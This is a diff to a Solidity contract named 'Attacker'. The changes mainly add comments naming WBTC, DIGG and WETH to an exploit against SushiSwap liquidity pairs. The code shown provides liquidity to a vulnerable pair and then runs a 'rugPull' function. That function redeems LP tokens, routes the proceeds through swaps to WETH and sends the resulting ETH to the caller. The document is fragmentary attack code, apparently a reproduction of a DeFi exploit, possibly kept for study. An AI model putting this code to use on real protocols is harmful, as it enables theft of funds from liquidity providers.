@@ -21,13 +21,13 @@ contract Attacker {
     }
 
     function createAndProvideLiquidity(
-        IERC20 wethBridgeToken,
-        IERC20 nonWethBridgeToken
+        IERC20 wethBridgeToken, // WBTC
+        IERC20 nonWethBridgeToken // DIGG
     ) external payable returns (IUniswapV2Pair pair) {
         // first acquire both tokens for vulnerable pair
         // we assume one token of the pair has a WETH pair
-        // trade ether to this token
-        // trade token/2 to other pair token
+        // deposit all ETH for WETH
+        // trade WETH/2 -> wethBridgeToken -> nonWethBridgeToken
         WETH.deposit{value: msg.value}();
         WETH.approve(address(sushiRouter), msg.value);
         address[] memory path = new address[](3);
@@ -63,11 +63,12 @@ contract Attacker {
         );
     }
 
-    function rugPull(IUniswapV2Pair wethPair, IERC20 wethBridgeToken)
-        external
-        payable
-    {
-        IERC20 otherToken = IERC20(wethPair.token0());
+    function rugPull(
+        IUniswapV2Pair wethPair, // DIGG <> WETH
+        IERC20 wethBridgeToken // WBTC
+    ) external payable {
+        // redeem LP tokens for underlying
+        IERC20 otherToken = IERC20(wethPair.token0()); // DIGG
         if (otherToken == WETH) {
             otherToken = IERC20(wethPair.token1());
         }
@@ -83,13 +84,14 @@ contract Attacker {
             type(uint256).max
         );
 
+        // trade otherToken -> wethBridgeToken -> WETH
         uint256 otherTokenBalance = otherToken.balanceOf(address(this));
         otherToken.approve(address(sushiRouter), otherTokenBalance);
         address[] memory path = new address[](3);
         path[0] = address(otherToken);
         path[1] = address(wethBridgeToken);
         path[2] = address(WETH);
-        
+
         uint256[] memory swapAmounts =
             sushiRouter.swapExactTokensForTokens(
                 otherTokenBalance,
@@ -99,10 +101,11 @@ contract Attacker {
                 type(uint256).max
             );
 
+        // convert WETH -> ETH
         WETH.withdraw(swapAmounts[2]);
         (bool success, ) = msg.sender.call{value: address(this).balance}("");
         require(success, "final transfer failed");
     }
 
-     receive() external payable {}
+    receive() external payable {}
 }
